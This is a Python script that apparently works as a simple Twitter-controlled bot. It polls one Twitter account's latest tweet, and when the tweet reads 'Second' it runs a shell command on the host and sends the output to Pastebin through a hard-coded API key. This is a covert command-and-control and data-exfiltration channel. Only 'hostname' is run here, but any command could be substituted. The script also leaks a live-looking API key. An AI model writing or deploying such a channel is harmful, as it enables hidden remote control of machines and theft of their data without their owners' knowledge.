# coding:utf-8
from bs4 import BeautifulSoup
import subprocess
import requests
import time

def paste(status):
	# importing the requests library
	import requests
	 
	# defining the api-endpoint
	API_ENDPOINT = "http://pastebin.com/api/api_post.php"
	 
	# your API key here
	API_KEY = "67cb000ec855276a3f6cf23cb7015dd9"
	 
	# your source code here
	source_code = str(status)
	 
	# data to be sent to api
	data = {'api_dev_key':API_KEY,
	        'api_option':'paste',
	        'api_paste_code':source_code,
	        'api_paste_name':'poyoyo',
	        'api_paste_format':'python'}
	 
	# sending post request and saving response as response object
	r = requests.post(url = API_ENDPOINT, data = data)
	 
	# extracting response text
	pastebin_url = r.text
	print("The pastebin URL is:%s"%pastebin_url)


history = ["0"]
while True:
	result = requests.get("https://twitter.com/esd27306513")

	c = result.content
	soup = BeautifulSoup(c, "lxml")
	samples = soup.find_all("p", "TweetTextSize")
	if samples[0].text != history[-1]:
		if samples[0].text == "Second":
			status = subprocess.Popen("hostname",shell=True,stdout=subprocess.PIPE).communicate()
			history.append(samples[0].text)
			paste(status)
